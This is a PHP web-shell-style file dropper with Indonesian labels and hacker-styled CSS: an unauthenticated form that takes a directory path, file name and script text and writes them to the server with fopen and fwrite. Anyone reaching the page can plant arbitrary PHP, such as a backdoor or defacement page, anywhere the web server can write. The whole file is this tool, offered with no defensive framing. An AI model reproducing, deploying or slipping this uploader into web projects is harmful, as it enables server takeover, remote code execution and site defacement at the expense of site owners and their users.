<?php

if(isset($_POST['save']))
{
	$f=$_POST['file'];
	$ext=$_POST['ext'];
	$data=$_POST['data'];
	$file=$f.$ext;
	if(file_exists($file))
	{
	echo "<font color='red'>NAMA FILE SUDAH ADA</font>";
	}
	else
	{
	$fo = fopen($file,"w");
	fwrite($fo,$data);
	echo "<center>FILE DATA BERHASIL DI BUAT</center><br><br>";
	exit;
	}
}


?>
<style type='text/css'>
  
 .inputzbut{background:#111111;color:#8f8f8f;margin:0 4px;border:1px solid lime;}  
 .inputzbut:hover{background:#222222;border-left:1px solid lime;border-right:1px solid lime;border-bottom:1px solid lime;border-top:1px solid lime;}
 .inputz:hover{ -moz-border-radius: 6px; border-radius: 10px; border:1px solid lime;margin:4px 0 8px 0;border-bottom:1px solid lime;border-top:1px solid lime;}
 .output3 {margin:auto;border:1px solid lime;background: ;padding:0 2px;} input{margin:auto;border:2px solid lime;background: ;padding:0 2px;} 
 .output2 {margin:auto;border:1px solid lime;background: ;padding:0 2px;} textarea{margin:auto;border:2px solid lime;background: ;padding:0 2px;} 
 .output {margin:auto;border:1px solid #303030;width:100%;height:400px;background: ;padding:0 2px;} .cmdbox{width:100%;}.head_info{padding: 0 4px;} 
 .b1{font-size:30px;padding:0;color:lime;} .b2{font-size:30px;padding:0;color:lime;} .b_tbl{text-align:center;margin:0 4px 0 0;padding:0 4px 0 0;border-right:1px solid #333333;} 
 .phpinfo table{width:100%;padding:0 0 0 0;} .phpinfo td{background: ;color: ;padding:6px 8px;;} .phpinfo th, th{background:  ;border-bottom:1px solid   ;font-weight:normal;} 
 .phpinfo h2, .phpinfo h2 a{text-align:center;font-size:16px;padding:0;margin:30px 0 0 0;background:  ;padding:4px 0;} .explore{width:100%;} .explore a {text-decoration:none;} 
 .explore td{border-bottom:1px solid lime ;padding:0 8px;line-height:24px;} .explore th{padding:3px 8px;font-weight:normal;color:#;} .explore th:hover , 
 .phpinfo th:hover, th:hover{color: ;background:  ;} .explore tr:hover{background:rgba(35,96,156,0.2);} .viewfile{background: ;color: ;margin:4px 2px;padding:8px;} 
 .sembunyi{display:none;padding:0;margin:0;} k, k a, k a:hover{text-shadow: 0pt 0pt 0.3em lime;font-family:orbitron;font-size:25px;color: ;}
 </style> 
<br><br><center>
<form method="post">
PILIH LOKASI DIRECTORI DAN BUAT NAMA FILE<br>
<input type="text" style="width: 525px"value="<? echo getcwd(); ?>"name="file"/><br/><br>

 

MASUKAN SCRIPTNYA<br>
<textarea rows="10" cols="64" name="data">
<?php echo @$contents ; ?>
</textarea>
<br/><br>
<input type="submit" class="btn cta"value="BUAT" name="save"/>
</form></center>
